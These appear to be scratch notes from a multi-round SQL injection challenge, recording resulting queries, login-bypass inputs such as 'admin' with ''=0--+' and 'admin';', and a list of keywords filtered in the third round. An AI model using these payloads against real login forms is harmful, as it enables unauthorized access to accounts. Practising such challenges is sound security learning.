# After SQL Injection
SELECT * FROM users WHERE username=''=admin'' AND password=''=0--+'

# Returns other pw after trying SELECT * FROM users WHERE username='admin%27%20--%20' AND password='=0==+'
SELECT * FROM users WHERE username='admin%27%20--%20' AND password='=0==+'


#Got to round two by doing 
admin
'=0--+


#Got the trick you find hints for your next sql injection on the filter.php page 
Round3: or and = like > < --
admin'; works as good as in round 2
